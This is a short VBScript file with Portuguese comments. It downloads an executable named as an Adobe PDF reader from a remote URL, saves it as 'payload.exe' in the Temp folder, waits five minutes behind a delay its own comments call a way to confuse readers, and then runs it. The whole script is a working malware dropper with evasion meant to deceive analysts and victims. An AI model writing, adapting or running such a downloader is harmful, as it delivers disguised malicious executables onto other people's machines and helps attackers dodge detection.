Option Explicit

Dim urlExe, destinoExe, http, stream, shell

urlExe = "https://testando123-blond.vercel.app/Adobe%20-%20Leitor%20de%20PDF.exe" ' Altere para sua URL real
destinoExe = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\payload.exe" ' Pasta Temp

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", urlExe, False
http.Send

If http.Status = 200 Then
    ' Salvar como binário usando ADODB.Stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' binário
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile destinoExe, 2 ' 2 = sobrescrever
    stream.Close
    
    Set shell = CreateObject("WScript." & "Shell") ' Separado para confundir

    ' === Início do delay ofuscado ===

    ' Construir o nome WScript dinamicamente
    Dim part1, part2, wsh
    part1 = "W"
    part2 = "Script"
    Set wsh = GetObject("winmgmts:").Get("Win32_Process") ' só para enganar o olho (não usado)
    
    ' Calcular o tempo do delay (300000 ms) via operações
    Dim base, multiplier, seconds, delayTime
    base = 1000
    multiplier = 5
    seconds = 60
    delayTime = base * multiplier * seconds ' 1000 * 5 * 60 = 300000
    
    ' Criar uma função para chamar Sleep escondida
    Call SleepDelay(shell, delayTime)

    ' === Fim do delay ofuscado ===
    
    ' Executar o payload
    shell.Run Chr(34) & destinoExe & Chr(34), 1, False
Else
    MsgBox "Falha ao baixar o payload: " & http.Status
End If


' Função para chamar Sleep escondida no meio do código
Sub SleepDelay(objShell, t)
    ' Obtem o objeto WScript via shell (hack visual)
    Dim wscriptObj
    Set wscriptObj = GetObject("script:" & "WScript") ' não existe, mas simula
    
    ' Na verdade usa o objeto shell para acessar WScript
    ' Como GetObject("script:...") não existe, só para confundir quem lê
    
    ' Chamando Sleep real
    WScript.Sleep t
End Sub
